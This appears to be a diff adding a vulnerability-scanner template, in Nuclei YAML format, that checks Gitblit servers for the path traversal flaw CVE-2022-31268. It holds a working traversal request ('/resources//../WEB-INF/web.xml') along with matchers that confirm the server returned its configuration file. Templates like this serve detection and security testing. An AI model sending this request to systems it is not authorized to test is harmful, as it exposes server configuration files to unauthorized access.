@@ -1,0 +1,32 @@
+id: gitblit-path-traversal
+
+info:
+  name: Gitblit Path Traversal Vulnerability (CVE-2022-31268)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-31268
+  description: |
+    Gitblit is vulnerable to a path traversal attack that allows unauthorized access to sensitive files on the server, such as the web.xml configuration file.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/resources//../WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "java.sun.com"
+          - "gitblit.properties"
+
+      - type: word
+        part: header
+        words:
+          - "application/xml"
